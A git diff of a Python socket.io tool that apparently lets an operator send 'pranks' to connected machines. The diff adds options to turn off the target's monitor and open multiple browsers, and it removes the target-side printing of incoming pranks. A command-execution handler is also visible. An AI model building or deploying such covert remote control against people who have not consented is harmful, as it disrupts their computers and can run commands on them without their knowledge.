@@ -72,6 +72,8 @@ def client_list(data):
                 print("2 - invert screen")
                 print("3 - fright")
                 print("4 - move mouse randomly")
+                print("5 - turn off monitor")
+                print("6 - open multiple browsers")
                 prank = input("Enter the prank: ")
 
                 match prank:
@@ -83,6 +85,10 @@ def client_list(data):
                         sio.emit('prank', {'to': selected_client, 'prank': 'fright'})
                     case "4":
                         sio.emit('prank', {'to': selected_client, 'prank': 'move mouse randomly'})
+                    case "5":
+                        sio.emit('prank', {'to': selected_client, 'prank': 'turn off monitor'})
+                    case "6":
+                        sio.emit('prank', {'to': selected_client, 'prank': 'open multiple browsers'})
                     case _:
                         print("Error: Unknow option. Return to menu...")
                         menu()
@@ -134,9 +140,6 @@ def broadcast_message(data):
 
 @sio.event
 def prank(data):
-
-    print(f"Prank received: {data}")
-    print('\n\n{}'.format(data.get('prank')))
     Pranks(data.get('prank')).prank_control()      
 
 @sio.event
@@ -175,7 +178,7 @@ def command_received(data):
             "error": str(e),
             "return_code": -1
         }
-    print(response.values)
+    print(response)
 #    sio.emit('result_command', {'to': from_client, 'result': response})
 
 """@sio.event
